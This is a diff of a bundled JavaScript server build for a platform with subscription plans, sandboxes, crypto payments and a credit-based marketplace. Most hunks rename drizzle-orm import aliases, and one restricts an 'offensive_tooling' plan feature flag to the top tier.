@@ -4082,7 +4082,7 @@ function isFeatureAllowed(planId, feature) {
     // Cyber+ exclusive features
     zero_click_research: ["cyber_plus", "titan"],
     c2_framework: ["cyber_plus", "titan"],
-    offensive_tooling: ["cyber_plus", "titan"],
+    offensive_tooling: ["titan"],
     custom_model_finetuning: ["cyber_plus", "titan"],
     multi_org: ["cyber_plus", "titan"],
     // Titan exclusive features
@@ -33997,7 +33997,7 @@ var blog_seed_exports = {};
 __export(blog_seed_exports, {
   seedBlogPosts: () => seedBlogPosts
 });
-import { eq as eq62, sql as sql35 } from "drizzle-orm";
+import { eq as eq63, sql as sql35 } from "drizzle-orm";
 async function seedBlogPosts() {
   const db = await getDb();
   if (!db) {
@@ -34008,7 +34008,7 @@ async function seedBlogPosts() {
   let inserted = 0;
   for (const post of posts) {
     try {
-      const existing = await db.select({ id: blogPosts.id }).from(blogPosts).where(eq62(blogPosts.slug, post.slug)).limit(1);
+      const existing = await db.select({ id: blogPosts.id }).from(blogPosts).where(eq63(blogPosts.slug, post.slug)).limit(1);
       if (existing.length > 0) continue;
       const wordCount = post.content.split(/\s+/).length;
       const readingTime = Math.ceil(wordCount / 200);
@@ -34046,17 +34046,17 @@ async function seedBlogPosts() {
     for (const cat of categories) {
       try {
         const name = cat.replace(/-/g, " ").replace(/\b\w/g, (l) => l.toUpperCase());
-        const existing = await db.select().from(blogCategories).where(eq62(blogCategories.slug, cat)).limit(1);
+        const existing = await db.select().from(blogCategories).where(eq63(blogCategories.slug, cat)).limit(1);
         if (existing.length === 0) {
-          const [{ count: count8 }] = await db.select({ count: sql35`count(*)` }).from(blogPosts).where(eq62(blogPosts.category, cat));
+          const [{ count: count8 }] = await db.select({ count: sql35`count(*)` }).from(blogPosts).where(eq63(blogPosts.category, cat));
           await db.insert(blogCategories).values({
             name,
             slug: cat,
             postCount: count8
           });
         } else {
-          const [{ count: count8 }] = await db.select({ count: sql35`count(*)` }).from(blogPosts).where(eq62(blogPosts.category, cat));
-          await db.update(blogCategories).set({ postCount: count8 }).where(eq62(blogCategories.slug, cat));
+          const [{ count: count8 }] = await db.select({ count: sql35`count(*)` }).from(blogPosts).where(eq63(blogPosts.category, cat));
+          await db.update(blogCategories).set({ postCount: count8 }).where(eq63(blogCategories.slug, cat));
         }
       } catch (err) {
       }
@@ -48531,16 +48531,16 @@ var crowdfundingRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { cryptoPayments: cryptoPayments2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63 } = await import("drizzle-orm");
+      const { eq: eq64 } = await import("drizzle-orm");
       const dbConn = await getDb2();
       if (!dbConn) throw new TRPCError25({ code: "INTERNAL_SERVER_ERROR" });
-      const [payment] = await dbConn.select().from(cryptoPayments2).where(eq63(cryptoPayments2.merchantTradeNo, input.merchantTradeNo));
+      const [payment] = await dbConn.select().from(cryptoPayments2).where(eq64(cryptoPayments2.merchantTradeNo, input.merchantTradeNo));
       if (!payment) throw new TRPCError25({ code: "NOT_FOUND" });
       if (payment.status === "pending" && isBinancePayConfigured()) {
         try {
           const binanceStatus = await queryOrderStatus(input.merchantTradeNo);
           if (binanceStatus?.data?.status === "PAID") {
-            await dbConn.update(cryptoPayments2).set({ status: "completed", paidAt: /* @__PURE__ */ new Date(), webhookData: JSON.stringify(binanceStatus.data) }).where(eq63(cryptoPayments2.merchantTradeNo, input.merchantTradeNo));
+            await dbConn.update(cryptoPayments2).set({ status: "completed", paidAt: /* @__PURE__ */ new Date(), webhookData: JSON.stringify(binanceStatus.data) }).where(eq64(cryptoPayments2.merchantTradeNo, input.merchantTradeNo));
             return { ...payment, status: "completed" };
           }
         } catch (err) {
@@ -48560,7 +48560,7 @@ var crowdfundingRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { cryptoPayments: cryptoPayments2, platformRevenue: platformRevenue2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, sql: sql36 } = await import("drizzle-orm");
+      const { eq: eq64, sql: sql36 } = await import("drizzle-orm");
       const dbConn = await getDb2();
       if (!dbConn) return { totalRevenue: 0, totalFees: 0, totalPayments: 0, completedPayments: 0 };
       const payments = await dbConn.select().from(cryptoPayments2);
@@ -48829,12 +48829,12 @@ var sandboxRouter = router({
   ).mutation(async ({ input, ctx }) => {
     const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
     const { sandboxes: sandboxes3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
     const db = await getDb2();
     if (!db) throw new Error("Database not available");
     const sandbox = await getSandbox(input.sandboxId, ctx.user.id);
     if (!sandbox) throw new Error("Sandbox not found");
-    await db.update(sandboxes3).set({ name: input.name }).where(and45(eq63(sandboxes3.id, input.sandboxId), eq63(sandboxes3.userId, ctx.user.id)));
+    await db.update(sandboxes3).set({ name: input.name }).where(and46(eq64(sandboxes3.id, input.sandboxId), eq64(sandboxes3.userId, ctx.user.id)));
     return { success: true };
   }),
   /**
@@ -48884,14 +48884,14 @@ var sandboxRouter = router({
   ).mutation(async ({ input, ctx }) => {
     const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
     const { sandboxes: sandboxes3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63 } = await import("drizzle-orm");
+    const { eq: eq64 } = await import("drizzle-orm");
     const sandbox = await getSandbox(input.sandboxId, ctx.user.id);
     if (!sandbox) throw new Error("Sandbox not found");
     const envVars = { ...sandbox.envVars || {} };
     delete envVars[input.key];
     const db = await getDb2();
     if (!db) throw new Error("Database not available");
-    await db.update(sandboxes3).set({ envVars }).where(eq63(sandboxes3.id, input.sandboxId));
+    await db.update(sandboxes3).set({ envVars }).where(eq64(sandboxes3.id, input.sandboxId));
     return { success: true };
   }),
   /**
@@ -49004,13 +49004,13 @@ var sandboxRouter = router({
   projectFiles: protectedProcedure.input(z31.object({ conversationId: z31.number().int().optional() }).optional()).query(async ({ ctx }) => {
     const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
     const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45, desc: desc45 } = await import("drizzle-orm");
+    const { eq: eq64, and: and46, desc: desc45 } = await import("drizzle-orm");
     const db = await getDb2();
     if (!db) return { files: [], projects: [] };
     const sandboxes3 = await listSandboxes(ctx.user.id);
     if (sandboxes3.length === 0) return { files: [], projects: [] };
     const sbId = sandboxes3[0].id;
-    const allFiles = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.sandboxId, sbId), eq63(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
+    const allFiles = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.sandboxId, sbId), eq64(sandboxFiles2.isDirectory, 0))).orderBy(desc45(sandboxFiles2.createdAt));
     const projectMap = /* @__PURE__ */ new Map();
     for (const file of allFiles) {
       const parts = file.filePath.split("/");
@@ -49043,12 +49043,12 @@ var sandboxRouter = router({
   projectFileContent: protectedProcedure.input(z31.object({ fileId: z31.number().int() })).query(async ({ ctx, input }) => {
     const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
     const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
     const db = await getDb2();
     if (!db) return { content: null, error: "Database unavailable" };
     const sandboxes3 = await listSandboxes(ctx.user.id);
     if (sandboxes3.length === 0) return { content: null, error: "No sandbox found" };
-    const [file] = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.id, input.fileId), eq63(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
+    const [file] = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.id, input.fileId), eq64(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
     if (!file) return { content: null, error: "File not found" };
     if (file.content) {
       return { content: file.content, path: file.filePath };
@@ -49071,12 +49071,12 @@ var sandboxRouter = router({
   projectFileDownloadUrl: protectedProcedure.input(z31.object({ fileId: z31.number().int() })).query(async ({ ctx, input }) => {
     const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
     const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
     const db = await getDb2();
     if (!db) return { url: null, error: "Database unavailable" };
     const sandboxes3 = await listSandboxes(ctx.user.id);
     if (sandboxes3.length === 0) return { url: null, error: "No sandbox found" };
-    const [file] = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.id, input.fileId), eq63(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
+    const [file] = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.id, input.fileId), eq64(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
     if (!file) return { url: null, error: "File not found" };
     if (file.s3Key) {
       try {
@@ -49093,12 +49093,12 @@ var sandboxRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, and: and45 } = await import("drizzle-orm");
+      const { eq: eq64, and: and46 } = await import("drizzle-orm");
       const db = await getDb2();
       if (!db) return { success: false, error: "Database unavailable" };
       const sandboxes3 = await listSandboxes(ctx.user.id);
       if (sandboxes3.length === 0) return { success: false, error: "No sandbox found" };
-      const [file] = await db.select().from(sandboxFiles2).where(and45(eq63(sandboxFiles2.id, input.fileId), eq63(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
+      const [file] = await db.select().from(sandboxFiles2).where(and46(eq64(sandboxFiles2.id, input.fileId), eq64(sandboxFiles2.sandboxId, sandboxes3[0].id))).limit(1);
       if (!file) return { success: false, error: "File not found" };
       if (file.s3Key) {
         try {
@@ -49107,7 +49107,7 @@ var sandboxRouter = router({
         } catch {
         }
       }
-      await db.delete(sandboxFiles2).where(eq63(sandboxFiles2.id, input.fileId));
+      await db.delete(sandboxFiles2).where(eq64(sandboxFiles2.id, input.fileId));
       return { success: true };
     } catch (err) {
       const msg = err instanceof Error ? err.message : String(err);
@@ -49119,29 +49119,29 @@ var sandboxRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, and: and45, like: like7, notLike, inArray: inArray3 } = await import("drizzle-orm");
+      const { eq: eq64, and: and46, like: like7, notLike, inArray: inArray3 } = await import("drizzle-orm");
       const db = await getDb2();
       if (!db) return { success: false, deleted: 0, error: "Database unavailable" };
       const sandboxes3 = await listSandboxes(ctx.user.id);
       if (sandboxes3.length === 0) return { success: false, deleted: 0, error: "No sandbox found \u2014 please create a project first" };
       let allFiles = [];
       if (input.projectName === "Ungrouped" || input.projectName === "general") {
-        allFiles = await db.select().from(sandboxFiles2).where(and45(
-          eq63(sandboxFiles2.sandboxId, sandboxes3[0].id),
+        allFiles = await db.select().from(sandboxFiles2).where(and46(
+          eq64(sandboxFiles2.sandboxId, sandboxes3[0].id),
           notLike(sandboxFiles2.filePath, "%/%")
         ));
       } else {
-        const files = await db.select().from(sandboxFiles2).where(and45(
-          eq63(sandboxFiles2.sandboxId, sandboxes3[0].id),
+        const files = await db.select().from(sandboxFiles2).where(and46(
+          eq64(sandboxFiles2.sandboxId, sandboxes3[0].id),
           like7(sandboxFiles2.filePath, `${input.projectName}/%`)
         ));
-        const exactFiles = await db.select().from(sandboxFiles2).where(and45(
-          eq63(sandboxFiles2.sandboxId, sandboxes3[0].id),
-          eq63(sandboxFiles2.filePath, input.projectName)
+        const exactFiles = await db.select().from(sandboxFiles2).where(and46(
+          eq64(sandboxFiles2.sandboxId, sandboxes3[0].id),
+          eq64(sandboxFiles2.filePath, input.projectName)
         ));
-        const byProjectName = await db.select().from(sandboxFiles2).where(and45(
-          eq63(sandboxFiles2.sandboxId, sandboxes3[0].id),
-          eq63(sandboxFiles2.projectName, input.projectName)
+        const byProjectName = await db.select().from(sandboxFiles2).where(and46(
+          eq64(sandboxFiles2.sandboxId, sandboxes3[0].id),
+          eq64(sandboxFiles2.projectName, input.projectName)
         ));
         const idSet = /* @__PURE__ */ new Set();
         allFiles = [...files, ...exactFiles, ...byProjectName].filter((f) => {
@@ -49174,14 +49174,14 @@ var sandboxRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, and: and45, inArray: inArray3 } = await import("drizzle-orm");
+      const { eq: eq64, and: and46, inArray: inArray3 } = await import("drizzle-orm");
       const db = await getDb2();
       if (!db) return { success: false, deleted: 0, error: "Database unavailable" };
       const sandboxes3 = await listSandboxes(ctx.user.id);
       if (sandboxes3.length === 0) return { success: false, deleted: 0, error: "No sandbox found" };
-      const files = await db.select().from(sandboxFiles2).where(and45(
+      const files = await db.select().from(sandboxFiles2).where(and46(
         inArray3(sandboxFiles2.id, input.fileIds),
-        eq63(sandboxFiles2.sandboxId, sandboxes3[0].id)
+        eq64(sandboxFiles2.sandboxId, sandboxes3[0].id)
       ));
       if (files.length === 0) return { success: false, deleted: 0, error: "No matching files found" };
       for (const file of files) {
@@ -49207,14 +49207,14 @@ var sandboxRouter = router({
     try {
       const { getDb: getDb2 } = await Promise.resolve().then(() => (init_db(), db_exports));
       const { sandboxFiles: sandboxFiles2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, inArray: inArray3 } = await import("drizzle-orm");
+      const { eq: eq64, inArray: inArray3 } = await import("drizzle-orm");
       const db = await getDb2();
       if (!db) return { success: false, deleted: 0, error: "Database unavailable" };
       const sandboxes3 = await listSandboxes(ctx.user.id);
       if (sandboxes3.length === 0) return { success: false, deleted: 0, error: "No sandbox found" };
       let totalDeleted = 0;
       for (const sb of sandboxes3) {
-        const allFiles = await db.select().from(sandboxFiles2).where(eq63(sandboxFiles2.sandboxId, sb.id));
+        const allFiles = await db.select().from(sandboxFiles2).where(eq64(sandboxFiles2.sandboxId, sb.id));
         if (allFiles.length === 0) continue;
         for (const file of allFiles) {
           if (file.s3Key) {
@@ -60510,12 +60510,12 @@ var marketplaceRouter = router({
         const dbInstance = await getDb();
         if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
         const { creditBalances: creditBalances3, creditTransactions: creditTransactions3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-        const { eq: eq63, sql: sqlOp } = await import("drizzle-orm");
+        const { eq: eq64, sql: sqlOp } = await import("drizzle-orm");
         await dbInstance.update(creditBalances3).set({
           credits: sqlOp`${creditBalances3.credits} - ${SELLER_ANNUAL_FEE_CREDITS}`,
           lifetimeCreditsUsed: sqlOp`${creditBalances3.lifetimeCreditsUsed} + ${SELLER_ANNUAL_FEE_CREDITS}`
-        }).where(eq63(creditBalances3.userId, ctx.user.id));
-        const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+        }).where(eq64(creditBalances3.userId, ctx.user.id));
+        const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
         await dbInstance.insert(creditTransactions3).values({
           userId: ctx.user.id,
           amount: -SELLER_ANNUAL_FEE_CREDITS,
@@ -60633,12 +60633,12 @@ var marketplaceRouter = router({
       const dbInstance = await getDb();
       if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
       const { creditBalances: creditBalances3, creditTransactions: creditTransactions3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-      const { eq: eq63, sql: sqlOp } = await import("drizzle-orm");
+      const { eq: eq64, sql: sqlOp } = await import("drizzle-orm");
       await dbInstance.update(creditBalances3).set({
         credits: sqlOp`${creditBalances3.credits} - ${SELLER_ANNUAL_FEE_CREDITS}`,
         lifetimeCreditsUsed: sqlOp`${creditBalances3.lifetimeCreditsUsed} + ${SELLER_ANNUAL_FEE_CREDITS}`
-      }).where(eq63(creditBalances3.userId, ctx.user.id));
-      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+      }).where(eq64(creditBalances3.userId, ctx.user.id));
+      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
       await dbInstance.insert(creditTransactions3).values({
         userId: ctx.user.id,
         amount: -SELLER_ANNUAL_FEE_CREDITS,
@@ -60828,9 +60828,9 @@ var marketplaceRouter = router({
     const dbInstance = await getDb();
     if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
     const { creditBalances: creditBalances3, creditTransactions: creditTransactions3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, sql: sql36 } = await import("drizzle-orm");
+    const { eq: eq64, sql: sql36 } = await import("drizzle-orm");
     return await dbInstance.transaction(async (tx) => {
-      const buyerBal = await tx.select({ credits: creditBalances3.credits, isUnlimited: creditBalances3.isUnlimited }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).for("update").limit(1);
+      const buyerBal = await tx.select({ credits: creditBalances3.credits, isUnlimited: creditBalances3.isUnlimited }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).for("update").limit(1);
       if (buyerBal.length === 0) throw new TRPCError28({ code: "BAD_REQUEST", message: "No credit balance found" });
       if (buyerBal[0].credits < listing.priceCredits && !buyerBal[0].isUnlimited) {
         throw new TRPCError28({ code: "BAD_REQUEST", message: `Insufficient credits. Need ${listing.priceCredits}, have ${buyerBal[0].credits}` });
@@ -60839,9 +60839,9 @@ var marketplaceRouter = router({
         await tx.update(creditBalances3).set({
           credits: sql36`${creditBalances3.credits} - ${listing.priceCredits}`,
           lifetimeCreditsUsed: sql36`${creditBalances3.lifetimeCreditsUsed} + ${listing.priceCredits}`
-        }).where(eq63(creditBalances3.userId, ctx.user.id));
+        }).where(eq64(creditBalances3.userId, ctx.user.id));
       }
-      const updatedBal = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+      const updatedBal = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
       const buyerBalanceAfter = updatedBal[0]?.credits ?? 0;
       await tx.insert(creditTransactions3).values({
         userId: ctx.user.id,
@@ -60852,16 +60852,16 @@ var marketplaceRouter = router({
       });
       const sellerShare = Math.floor(listing.priceCredits * (1 - PLATFORM_COMMISSION_RATE));
       if (sellerShare > 0) {
-        const sellerBal = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, listing.sellerId)).for("update").limit(1);
+        const sellerBal = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, listing.sellerId)).for("update").limit(1);
         if (sellerBal.length === 0) {
           await tx.insert(creditBalances3).values({ userId: listing.sellerId, credits: sellerShare, lifetimeCreditsAdded: sellerShare });
         } else {
           await tx.update(creditBalances3).set({
             credits: sql36`${creditBalances3.credits} + ${sellerShare}`,
             lifetimeCreditsAdded: sql36`${creditBalances3.lifetimeCreditsAdded} + ${sellerShare}`
-          }).where(eq63(creditBalances3.userId, listing.sellerId));
+          }).where(eq64(creditBalances3.userId, listing.sellerId));
         }
-        const sellerUpdated = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, listing.sellerId)).limit(1);
+        const sellerUpdated = await tx.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, listing.sellerId)).limit(1);
         await tx.insert(creditTransactions3).values({
           userId: listing.sellerId,
           amount: sellerShare,
@@ -61129,13 +61129,13 @@ var marketplaceRouter = router({
     const dbInstance = await getDb();
     if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
     const { creditBalances: creditBalances3, creditTransactions: creditTransactions3, marketplaceListings: marketplaceListings2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, sql: sqlOp } = await import("drizzle-orm");
+    const { eq: eq64, sql: sqlOp } = await import("drizzle-orm");
     if (!balance.isUnlimited) {
       await dbInstance.update(creditBalances3).set({
         credits: sqlOp`${creditBalances3.credits} - ${FEATURE_COST}`,
         lifetimeCreditsUsed: sqlOp`${creditBalances3.lifetimeCreditsUsed} + ${FEATURE_COST}`
-      }).where(eq63(creditBalances3.userId, ctx.user.id));
-      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+      }).where(eq64(creditBalances3.userId, ctx.user.id));
+      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
       await dbInstance.insert(creditTransactions3).values({
         userId: ctx.user.id,
         amount: -FEATURE_COST,
@@ -61144,7 +61144,7 @@ var marketplaceRouter = router({
         balanceAfter: updatedBal[0]?.credits ?? 0
       });
     }
-    await dbInstance.update(marketplaceListings2).set({ featured: true }).where(eq63(marketplaceListings2.id, input.listingId));
+    await dbInstance.update(marketplaceListings2).set({ featured: true }).where(eq64(marketplaceListings2.id, input.listingId));
     return { success: true, cost: FEATURE_COST, message: "Listing featured for 30 days" };
   }),
   /** Boost a listing — costs 200 credits, increases visibility for 7 days */
@@ -61161,13 +61161,13 @@ var marketplaceRouter = router({
     const dbInstance = await getDb();
     if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
     const { creditBalances: creditBalances3, creditTransactions: creditTransactions3, marketplaceListings: marketplaceListings2 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, sql: sqlOp } = await import("drizzle-orm");
+    const { eq: eq64, sql: sqlOp } = await import("drizzle-orm");
     if (!balance.isUnlimited) {
       await dbInstance.update(creditBalances3).set({
         credits: sqlOp`${creditBalances3.credits} - ${BOOST_COST}`,
         lifetimeCreditsUsed: sqlOp`${creditBalances3.lifetimeCreditsUsed} + ${BOOST_COST}`
-      }).where(eq63(creditBalances3.userId, ctx.user.id));
-      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+      }).where(eq64(creditBalances3.userId, ctx.user.id));
+      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
       await dbInstance.insert(creditTransactions3).values({
         userId: ctx.user.id,
         amount: -BOOST_COST,
@@ -61178,7 +61178,7 @@ var marketplaceRouter = router({
     }
     await dbInstance.update(marketplaceListings2).set({
       viewCount: sqlOp`${marketplaceListings2.viewCount} + 100`
-    }).where(eq63(marketplaceListings2.id, input.listingId));
+    }).where(eq64(marketplaceListings2.id, input.listingId));
     return { success: true, cost: BOOST_COST, message: "Listing boosted for 7 days" };
   }),
   /** Verify seller — costs 1000 credits, gets verified badge permanently */
@@ -61194,13 +61194,13 @@ var marketplaceRouter = router({
     const dbInstance = await getDb();
     if (!dbInstance) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR" });
     const { creditBalances: creditBalances3, creditTransactions: creditTransactions3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, sql: sqlOp } = await import("drizzle-orm");
+    const { eq: eq64, sql: sqlOp } = await import("drizzle-orm");
     if (!balance.isUnlimited) {
       await dbInstance.update(creditBalances3).set({
         credits: sqlOp`${creditBalances3.credits} - ${VERIFY_COST}`,
         lifetimeCreditsUsed: sqlOp`${creditBalances3.lifetimeCreditsUsed} + ${VERIFY_COST}`
-      }).where(eq63(creditBalances3.userId, ctx.user.id));
-      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq63(creditBalances3.userId, ctx.user.id)).limit(1);
+      }).where(eq64(creditBalances3.userId, ctx.user.id));
+      const updatedBal = await dbInstance.select({ credits: creditBalances3.credits }).from(creditBalances3).where(eq64(creditBalances3.userId, ctx.user.id)).limit(1);
       await dbInstance.insert(creditTransactions3).values({
         userId: ctx.user.id,
         amount: -VERIFY_COST,
@@ -61230,8 +61230,8 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database || !ctx.user?.id) return [];
     const { sellerPayoutMethods: sellerPayoutMethods3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63 } = await import("drizzle-orm");
-    return database.select().from(sellerPayoutMethods3).where(eq63(sellerPayoutMethods3.userId, ctx.user.id));
+    const { eq: eq64 } = await import("drizzle-orm");
+    return database.select().from(sellerPayoutMethods3).where(eq64(sellerPayoutMethods3.userId, ctx.user.id));
   }),
   /** Add a new payout method */
   addPayoutMethod: protectedProcedure.input(z40.object({
@@ -61252,8 +61252,8 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database || !ctx.user?.id) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR", message: "DB not available" });
     const { sellerProfiles: sellerProfiles3, sellerPayoutMethods: sellerPayoutMethods3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
-    const profiles = await database.select().from(sellerProfiles3).where(eq63(sellerProfiles3.userId, ctx.user.id)).limit(1);
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
+    const profiles = await database.select().from(sellerProfiles3).where(eq64(sellerProfiles3.userId, ctx.user.id)).limit(1);
     if (profiles.length === 0) throw new TRPCError28({ code: "FORBIDDEN", message: "You must be a registered seller to add payout methods" });
     const seller = profiles[0];
     if (input.methodType === "bank_transfer") {
@@ -61266,9 +61266,9 @@ var marketplaceRouter = router({
       }
     }
     if (input.isDefault) {
-      await database.update(sellerPayoutMethods3).set({ isDefault: false }).where(eq63(sellerPayoutMethods3.userId, ctx.user.id));
+      await database.update(sellerPayoutMethods3).set({ isDefault: false }).where(eq64(sellerPayoutMethods3.userId, ctx.user.id));
     }
-    const existing = await database.select().from(sellerPayoutMethods3).where(eq63(sellerPayoutMethods3.userId, ctx.user.id));
+    const existing = await database.select().from(sellerPayoutMethods3).where(eq64(sellerPayoutMethods3.userId, ctx.user.id));
     const shouldBeDefault = existing.length === 0 || input.isDefault;
     let stripeConnectAccountId;
     if (input.methodType === "stripe_connect") {
@@ -61355,11 +61355,11 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database || !ctx.user?.id) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR", message: "DB not available" });
     const { sellerPayoutMethods: sellerPayoutMethods3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
-    const methods = await database.select().from(sellerPayoutMethods3).where(and45(eq63(sellerPayoutMethods3.id, input.id), eq63(sellerPayoutMethods3.userId, ctx.user.id))).limit(1);
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
+    const methods = await database.select().from(sellerPayoutMethods3).where(and46(eq64(sellerPayoutMethods3.id, input.id), eq64(sellerPayoutMethods3.userId, ctx.user.id))).limit(1);
     if (methods.length === 0) throw new TRPCError28({ code: "NOT_FOUND", message: "Payout method not found" });
     if (input.isDefault) {
-      await database.update(sellerPayoutMethods3).set({ isDefault: false }).where(eq63(sellerPayoutMethods3.userId, ctx.user.id));
+      await database.update(sellerPayoutMethods3).set({ isDefault: false }).where(eq64(sellerPayoutMethods3.userId, ctx.user.id));
     }
     const updateData = {};
     if (input.label !== void 0) updateData.label = input.label;
@@ -61371,7 +61371,7 @@ var marketplaceRouter = router({
     if (input.bankSwiftBic !== void 0) updateData.bankSwiftBic = input.bankSwiftBic;
     if (input.paypalEmail !== void 0) updateData.paypalEmail = input.paypalEmail;
     if (input.isDefault !== void 0) updateData.isDefault = input.isDefault;
-    await database.update(sellerPayoutMethods3).set(updateData).where(and45(eq63(sellerPayoutMethods3.id, input.id), eq63(sellerPayoutMethods3.userId, ctx.user.id)));
+    await database.update(sellerPayoutMethods3).set(updateData).where(and46(eq64(sellerPayoutMethods3.id, input.id), eq64(sellerPayoutMethods3.userId, ctx.user.id)));
     return { success: true };
   }),
   /** Delete a payout method */
@@ -61379,8 +61379,8 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database || !ctx.user?.id) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR", message: "DB not available" });
     const { sellerPayoutMethods: sellerPayoutMethods3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
-    await database.delete(sellerPayoutMethods3).where(and45(eq63(sellerPayoutMethods3.id, input.id), eq63(sellerPayoutMethods3.userId, ctx.user.id)));
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
+    await database.delete(sellerPayoutMethods3).where(and46(eq64(sellerPayoutMethods3.id, input.id), eq64(sellerPayoutMethods3.userId, ctx.user.id)));
     return { success: true };
   }),
